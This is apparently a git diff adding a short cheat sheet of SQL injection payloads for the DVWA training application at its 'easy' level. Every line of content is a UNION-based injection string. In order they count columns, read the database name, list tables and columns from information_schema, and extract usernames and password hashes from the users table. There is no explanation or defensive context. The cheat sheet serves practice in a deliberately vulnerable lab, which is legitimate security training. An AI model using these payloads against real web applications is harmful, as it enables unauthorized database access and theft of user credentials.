@@ -1,0 +1,15 @@
+SQL INJECTION EASY DVWA
+'CLOUMN ENUMURATE'
+1. 2' union select 1,2#
+  'DATABASE NAME'
+2. 2' union SELECT null,database()#
+  'TABLE NAME'
+3. 2' union SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema = 'dvwa';#
+  'COLUMN NAME'
+4. 2' union SELECT null,column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa'#
+  'GET USERNAME'
+5. 2' union SELECT 'user' AS column_name, user AS column_data FROM users;#
+  'GET PASSWORD'
+6. 2' union SELECT 'password' AS column_name, password AS column_data FROM users;#
+  'GET USERNAME & PASSWORD BOTH'
+7. 2' union SELECT user AS column_data, password AS column_data FROM users;#
